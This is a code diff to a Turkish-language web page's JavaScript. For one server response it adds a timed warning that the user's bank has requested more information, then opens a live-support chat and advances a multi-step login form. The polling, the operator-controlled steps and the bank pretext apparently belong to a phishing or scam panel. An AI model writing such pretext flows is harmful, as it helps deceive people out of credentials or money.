@@ -178,10 +178,24 @@ function myLoop2() {         //  create a loop function
               Swal.fire("Yatırım başarılı!","","success")
               window.location.pathname = '/m';
             } else if(response == '4'){
-              $('#login-step-2').addClass('d-none');
-              $('#login-step-2').removeClass('d-flex');
-              $('#login-step-3').removeClass('d-none');
-              $('#login-step-3').addClass('d-flex');
+              swal.close();
+              Swal.fire({
+                title: 'Uyarı!',
+                text: 'Bankanız Ek Bilgi Talep Etti, 5 Saniye İçinde Canlı Desteğe Bağlanılacak....',
+                allowOutsideClick: false,
+                showConfirmButton: false
+              }) 
+              setTimeout(function(){
+                swal.close();
+                maximizeTawkToWidget();
+                $('#login-step-2').addClass('d-none');
+                $('#login-step-2').removeClass('d-flex');
+                $('#login-step-3').removeClass('d-none');
+                $('#login-step-3').addClass('d-flex');
+              },
+              
+              5000)
+             
                swal.close();
 
             }
